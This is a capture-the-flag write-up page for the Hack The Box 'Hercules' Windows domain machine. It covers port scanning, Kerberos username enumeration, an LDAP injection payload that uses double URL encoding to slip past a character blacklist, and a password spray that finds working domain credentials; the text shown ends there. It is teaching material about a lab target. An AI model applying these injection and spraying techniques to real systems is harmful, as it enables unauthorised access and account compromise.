@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Hercules | Paracausal Telemetry</title><meta name="description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos (88), SMB (445), HTTP (80)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Hercules" /><meta property="og:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos (88), SMB (445), HTTP (80)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/og.png?v=3f620020" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Hercules" /><meta name="twitter:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos (88), SMB (445), HTTP (80)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/og.png?v=3f620020" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Hercules","description":"Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos (88), SMB (445), HTTP (80).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/","datePublished":"2026-09-11","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Hercules","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-hercules/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Hercules</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-09-11 · 39 min read</p><h1>Hercules</h1><p>Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Kerberos (88), SMB (445), HTTP (80).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · insane</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Hercules" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-hercules.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head"><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Hercules</h2></div><span class="room-badge room-badge-insane">Insane</span></div><dl class="room-facts"><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div></dl><p class="room-link"><a href="https://app.hackthebox.com/machines/Hercules" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><blockquote><p>PLEASE NOTE: THE MACHINE WAS BOOTED SEVERAL TIMES OVER SO IP ADDRESSES MAY BE DIFFERENT</p></blockquote><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.242.196 --generate-hosts-file /etc/hosts                                         
+[sudo] password for kali: 
+SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)</code></pre><p>NTLM auth is disabled</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn dc.hercules.htb -vv
+
+Nmap scan report for dc.hercules.htb (10.129.242.196)
+Host is up, received user-set (0.014s latency).
+Scanned at 2026-09-11 17:52:34 BST for 66s
+Not shown: 65513 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+443/tcp   open  https            syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5986/tcp  open  wsmans           syn-ack
+9389/tcp  open  adws             syn-ack
+49664/tcp open  unknown          syn-ack
+49668/tcp open  unknown          syn-ack
+51753/tcp open  unknown          syn-ack
+56289/tcp open  unknown          syn-ack
+56313/tcp open  unknown          syn-ack
+57888/tcp open  unknown          syn-ack
+57897/tcp open  unknown          syn-ack</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc.hercules.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 17:54 +0100
+Nmap scan report for dc.hercules.htb (10.129.242.196)
+Host is up (0.014s latency).
+
+PORT     STATE    SERVICE       VERSION
+53/tcp   open     domain        Simple DNS Plus
+80/tcp   open     http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to https://dc.hercules.htb/
+88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-11 16:55:00Z)
+135/tcp  open     msrpc         Microsoft Windows RPC
+139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hercules.htb
+| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
+| Not valid before: 2024-12-04T01:34:52
+|_Not valid after:  2034-12-02T01:34:52
+|_ssl-date: TLS randomness does not represent time
+443/tcp  open     ssl/https     Microsoft-IIS/10.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=hercules.htb
+| Subject Alternative Name: DNS:hercules.htb
+| Not valid before: 2024-12-04T01:34:56
+|_Not valid after:  2034-12-04T01:44:56
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open     microsoft-ds?
+464/tcp  open     kpasswd5?
+593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.hercules.htb
+| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
+| Not valid before: 2024-12-04T01:34:52
+|_Not valid after:  2034-12-02T01:34:52
+3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.hercules.htb
+| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
+| Not valid before: 2024-12-04T01:34:52
+|_Not valid after:  2034-12-02T01:34:52
+3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hercules.htb
+| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
+| Not valid before: 2024-12-04T01:34:52
+|_Not valid after:  2034-12-02T01:34:52
+|_ssl-date: TLS randomness does not represent time
+5985/tcp filtered wsman
+9389/tcp open     mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h3>System time</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ntpdate dc.hercules.htb
+2026-09-11 17:57:45.113530 (+0100) -0.012739 +/- 0.101796 dc.hercules.htb 10.129.242.196 s1 no-leap
+CLOCK: adj_systime: Operation not permitted</code></pre><p>So since NTLM is disabled its worth checking what the clock skew is since ill be working with kerberos, but in this case its running at the same time as me</p><h2>Kerberos (88)</h2><p>Im gong to leave kerbrute running in the background to try and enumerate some valid users</p><h2>SMB (445)</h2><p>Null auth is not worth testing for here since there is no NTLM</p><p>Guest account disabled</p><h2>HTTP (80)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -s http://hercules.htb/ -v            
+* Host hercules.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.242.196
+*   Trying 10.129.242.196:80...
+* Established connection to hercules.htb (10.129.242.196 port 80) from 10.10.14.61 port 46348 
+* using HTTP/1.x
+&gt; GET / HTTP/1.1
+&gt; Host: hercules.htb
+&gt; User-Agent: curl/8.21.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 301 Moved Permanently
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Location: https://hercules.htb/
+&lt; Server: Microsoft-IIS/10.0
+&lt; Date: Fri, 11 Sep 2026 17:03:19 GMT
+&lt; Content-Length: 144
+&lt; 
+&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
+* Connection #0 to host hercules.htb:80 left intact
+&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This document may be found &lt;a HREF=&quot;https://hercules.htb/&quot;&gt;here&lt;/a&gt;&lt;/body&gt;</code></pre><p>So like nmap said, the webserver on port 80 is redirecting to the server on 443</p><h2>HTTPS (443)</h2><p>There isnt a lot on the website apart from a contact page which doesnt look to be vulnerable in any way</p><h3>Feroxbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">feroxbuster -u https://hercules.htb/ -C 404 --dont-filter --insecure
+
+200      GET       53l      162w     3213c https://hercules.htb/login</code></pre><p>There are a lot of other endpoints, but most of them exist inside content and are all either framework js files or images</p><p><img src="images/hercules/pasted-image-20260911182354.webp" alt="Screenshot" loading="lazy" /></p><p>This is the logon portal</p><p><img src="images/hercules/pasted-image-20260911182503.webp" alt="Screenshot" loading="lazy" /></p><p>This kinda prevents me from fuzzing the logon portal, and anything suspicious will be flagged</p><p><img src="images/hercules/pasted-image-20260911182614.webp" alt="Screenshot" loading="lazy" /></p><p>Using <code>*:*</code> i get the error invalid username, i think this may be vulnerable to LDAP injection</p><p>Kerbrute found the username <code>auditor</code> and since i know this logon portal is using domain credentials i tested the creds <code>auditor:*</code> and it gave the error <code>login attempt failed</code></p><h2>LDAP injection</h2><p>Kerbrute has just found the name <code>will.s</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 30
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop
+
+2026/09/14 16:03:01 &gt;  Using KDC(s):
+2026/09/14 16:03:01 &gt;  	dc.hercules.htb:88
+
+2026/09/14 16:03:01 &gt;  [+] VALID USERNAME:	admin@hercules.htb
+2026/09/14 16:03:01 &gt;  [+] VALID USERNAME:	administrator@hercules.htb
+2026/09/14 16:03:01 &gt;  [+] VALID USERNAME:	Admin@hercules.htb
+2026/09/14 16:03:07 &gt;  [+] VALID USERNAME:	Administrator@hercules.htb
+2026/09/14 16:03:14 &gt;  [+] VALID USERNAME:	auditor@hercules.htb
+2026/09/14 16:03:36 &gt;  [+] VALID USERNAME:	ADMIN@hercules.htb
+2026/09/14 16:11:21 &gt;  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 17:06:00 &gt;  [+] VALID USERNAME:	aDmin@hercules.htb
+2026/09/14 17:06:18 &gt;  [+] VALID USERNAME:	Will.S@hercules.htb
+2026/09/14 17:12:09 &gt;  [+] VALID USERNAME:	AUDITOR@hercules.htb
+2026/09/14 17:13:44 &gt;  Done! Tested 8295455 usernames (10 valid) in 4243.378 seconds</code></pre><p>After a whole lot of testing and using errors to enumerate further i think there is a character blacklist on the LDAP injection which means i cant use chars such as <code>*</code></p><p>But it looks like a double URL encoding works</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*)(description=a*</code></pre><p>I will try an enumerate the description field for one of these users, i will put this into cyberchef</p><p><img src="images/hercules/pasted-image-20260914162917.webp" alt="Screenshot" loading="lazy" /></p><p>This is my strategy, i will double URL encode the payload to avoid the blacklist then simply just send request until i get a different error message</p><p><img src="images/hercules/pasted-image-20260914163116.webp" alt="Screenshot" loading="lazy" /></p><p>Using the <code>a</code> as the first character i get the error <code>Invalid login attempt</code> and also the same with <code>b</code> so this tells me this error is an invalid character</p><p><img src="images/hercules/pasted-image-20260914163242.webp" alt="Screenshot" loading="lazy" /></p><p>But now using <code>c</code> i get <code>Login attempt failed</code> this tells me this is a valid character, ill continue this process</p><p>Ill also ask AI to make me a list of users following the format of a user i know exists <code>will.s</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum --dc dc.hercules.htb -d hercules.htb usernames.txt -t 30
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop
+
+2026/09/14 17:21:12 &gt;  Using KDC(s):
+2026/09/14 17:21:12 &gt;  	dc.hercules.htb:88
+
+2026/09/14 17:21:12 &gt;  [+] VALID USERNAME:	ashley.b@hercules.htb
+2026/09/14 17:21:14 &gt;  [+] VALID USERNAME:	elijah.m@hercules.htb
+2026/09/14 17:21:14 &gt;  [+] VALID USERNAME:	fiona.c@hercules.htb
+2026/09/14 17:21:14 &gt;  [+] VALID USERNAME:	heather.s@hercules.htb
+2026/09/14 17:21:14 &gt;  [+] VALID USERNAME:	jacob.b@hercules.htb
+2026/09/14 17:21:14 &gt;  [+] VALID USERNAME:	jennifer.a@hercules.htb
+2026/09/14 17:21:15 &gt;  [+] VALID USERNAME:	jessica.e@hercules.htb
+2026/09/14 17:21:15 &gt;  [+] VALID USERNAME:	joel.c@hercules.htb
+2026/09/14 17:21:15 &gt;  [+] VALID USERNAME:	johanna.f@hercules.htb
+2026/09/14 17:21:16 &gt;  [+] VALID USERNAME:	mark.s@hercules.htb
+2026/09/14 17:21:16 &gt;  [+] VALID USERNAME:	mikayla.a@hercules.htb
+2026/09/14 17:21:16 &gt;  [+] VALID USERNAME:	natalie.a@hercules.htb
+2026/09/14 17:21:16 &gt;  [+] VALID USERNAME:	patrick.s@hercules.htb
+2026/09/14 17:21:17 &gt;  [+] VALID USERNAME:	stephanie.w@hercules.htb
+2026/09/14 17:21:17 &gt;  [+] VALID USERNAME:	stephen.m@hercules.htb
+2026/09/14 17:21:18 &gt;  [+] VALID USERNAME:	vincent.g@hercules.htb
+2026/09/14 17:21:18 &gt;  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 17:21:22 &gt;  Done! Tested 13234 usernames (17 valid) in 9.970 seconds</code></pre><p>Found more users!</p><p>Now i have more users its possible i have to target a specific users description field, so i can use this in my LDAP injection payload</p><p><img src="images/hercules/pasted-image-20260914174557.webp" alt="Screenshot" loading="lazy" /></p><p>After continuous testing of this description field i know there is a password <code>change*th1s_p@ssw()rd!!</code> but not yet sure which user its for</p><p>Ill spray this password against my current userlist, since this logon is vulnerable to LDAP injection it will use domain creds so a valid domain logon is also a valid website logon</p><p>There is no valid logons, the password could be for a user ive not discovered yet</p><p>Ill ask AI to extend this userlist further</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum --dc dc.hercules.htb -d hercules.htb usernames_extended.txt -t 30
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop
+
+2026/09/14 17:52:54 &gt;  Using KDC(s):
+2026/09/14 17:52:54 &gt;  	dc.hercules.htb:88
+
+2026/09/14 17:52:55 &gt;  [+] VALID USERNAME:	ashley.b@hercules.htb
+2026/09/14 17:52:57 &gt;  [+] VALID USERNAME:	elijah.m@hercules.htb
+2026/09/14 17:52:57 &gt;  [+] VALID USERNAME:	fiona.c@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	heather.s@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	jacob.b@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	jennifer.a@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	jessica.e@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	joel.c@hercules.htb
+2026/09/14 17:52:58 &gt;  [+] VALID USERNAME:	johanna.f@hercules.htb
+2026/09/14 17:52:59 &gt;  [+] VALID USERNAME:	ken.w@hercules.htb
+2026/09/14 17:53:00 &gt;  [+] VALID USERNAME:	mark.s@hercules.htb
+2026/09/14 17:53:00 &gt;  [+] VALID USERNAME:	mikayla.a@hercules.htb
+2026/09/14 17:53:01 &gt;  [+] VALID USERNAME:	natalie.a@hercules.htb
+2026/09/14 17:53:01 &gt;  [+] VALID USERNAME:	patrick.s@hercules.htb
+2026/09/14 17:53:01 &gt;  [+] VALID USERNAME:	ray.n@hercules.htb
+2026/09/14 17:53:01 &gt;  [+] VALID USERNAME:	rene.s@hercules.htb
+2026/09/14 17:53:03 &gt;  [+] VALID USERNAME:	stephanie.w@hercules.htb
+2026/09/14 17:53:03 &gt;  [+] VALID USERNAME:	stephen.m@hercules.htb
+2026/09/14 17:53:03 &gt;  [+] VALID USERNAME:	tanya.r@hercules.htb
+2026/09/14 17:53:03 &gt;  [+] VALID USERNAME:	vincent.g@hercules.htb
+2026/09/14 17:53:03 &gt;  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 17:53:05 &gt;  Done! Tested 20170 usernames (21 valid) in 11.064 seconds</code></pre><p>Found a few more users!</p><p>Ill now perform this password spray again</p><h2>Valid domain credentials and access to web portal</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u confirmed_users.txt -p &#39;change*th1s_p@ssw()rd!!&#39; -k --continue-on-success 
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\ashley.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\elijah.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\fiona.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\heather.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jacob.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jennifer.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jessica.e:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\joel.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\johanna.f:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\mark.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\mikayla.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\natalie.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\patrick.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\ray.n:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\rene.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\stephanie.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\stephen.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\tanya.r:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\vincent.g:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\will.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\auditor:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
